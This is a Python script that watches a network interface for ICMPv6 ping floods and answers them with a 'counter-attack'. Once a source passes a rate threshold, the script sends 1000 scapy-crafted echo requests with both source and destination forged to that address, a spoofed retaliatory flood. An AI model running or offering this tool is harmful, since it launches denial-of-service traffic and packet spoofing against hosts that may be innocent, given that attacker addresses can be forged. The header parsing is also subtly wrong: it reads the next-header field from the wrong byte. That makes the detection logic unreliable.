#!/usr/bin/env python3
import socket
import struct
import time
import threading
import ipaddress
import random
from scapy.all import *

# Constants
FLOOD_THRESHOLD = 10  # Number of packets per second to consider as flooding
COUNTER_ATTACK_DURATION = 30  # Duration of counter-attack in seconds
PACKET_SIZE = 64  # Size of ICMPv6 packets

class PingFloodCounter:
    def __init__(self):
        self.attackers = {}  # Dictionary to track potential attackers
        self.lock = threading.Lock()
        self.running = True

    def create_icmpv6_packet(self, src_ip, dst_ip, payload=None):
        """Create an ICMPv6 Echo Request packet with custom headers"""
        if payload is None:
            payload = b'X' * (PACKET_SIZE - 8)  # 8 bytes for ICMPv6 header

        # Create IPv6 header
        ipv6 = IPv6(
            src=src_ip,
            dst=dst_ip,
            nh=58  # ICMPv6 protocol number
        )

        # Create ICMPv6 Echo Request
        icmpv6 = ICMPv6EchoRequest(
            id=random.randint(0, 65535),
            seq=random.randint(0, 65535),
            data=payload
        )

        return ipv6/icmpv6

    def monitor_traffic(self):
        """Monitor network traffic for ICMPv6 Echo Requests"""
        try:
            # Create raw socket for capturing packets
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
            s.bind(('eth0', 0))  # Replace 'eth0' with your network interface

            while self.running:
                packet = s.recvfrom(65535)[0]
                
                # Parse Ethernet header
                eth_header = struct.unpack('!6s6sH', packet[:14])
                eth_type = eth_header[2]

                if eth_type == 0x86dd:  # IPv6
                    # Parse IPv6 header
                    ipv6_header = struct.unpack('!BBHHBB16s16s', packet[14:54])
                    next_header = ipv6_header[0] & 0xFF

                    if next_header == 58:  # ICMPv6
                        # Parse ICMPv6 header
                        icmpv6_header = struct.unpack('!BBHHH', packet[54:64])
                        icmpv6_type = icmpv6_header[0]

                        if icmpv6_type == 128:  # Echo Request
                            src_ip = ipaddress.IPv6Address(packet[22:38])
                            current_time = time.time()

                            with self.lock:
                                if src_ip not in self.attackers:
                                    self.attackers[src_ip] = {'count': 1, 'first_seen': current_time}
                                else:
                                    self.attackers[src_ip]['count'] += 1
                                    
                                    # Check if this is a flood attack
                                    time_diff = current_time - self.attackers[src_ip]['first_seen']
                                    if time_diff >= 1.0:  # Check rate over 1 second
                                        rate = self.attackers[src_ip]['count'] / time_diff
                                        if rate >= FLOOD_THRESHOLD:
                                            print(f"Flood attack detected from {src_ip}! Rate: {rate:.2f} packets/sec")
                                            self.counter_attack(src_ip)
                                            self.attackers[src_ip] = {'count': 0, 'first_seen': current_time}

        except Exception as e:
            print(f"Error in monitor_traffic: {e}")

    def counter_attack(self, attacker_ip):
        """Launch counter-attack against the attacker"""
        print(f"Launching counter-attack against {attacker_ip}")
        
        # Get local IPv6 address
        local_ip = self.get_local_ipv6()
        
        # Create and send spoofed packets
        for _ in range(1000):  # Send 1000 packets in the counter-attack
            packet = self.create_icmpv6_packet(attacker_ip, attacker_ip)
            send(packet, verbose=0)
            time.sleep(0.001)  # Small delay to avoid overwhelming the network

    def get_local_ipv6(self):
        """Get local IPv6 address"""
        try:
            s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
            s.connect(('2001:4860:4860::8888', 80))  # Google's IPv6 DNS
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return '::1'  # Fallback to localhost

    def start(self):
        """Start the monitoring and counter-attack system"""
        print("Starting Ping Flood Counter Attack system...")
        monitor_thread = threading.Thread(target=self.monitor_traffic)
        monitor_thread.daemon = True
        monitor_thread.start()

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nShutting down...")
            self.running = False
            monitor_thread.join()

if __name__ == "__main__":
    counter = PingFloodCounter()
    counter.start() 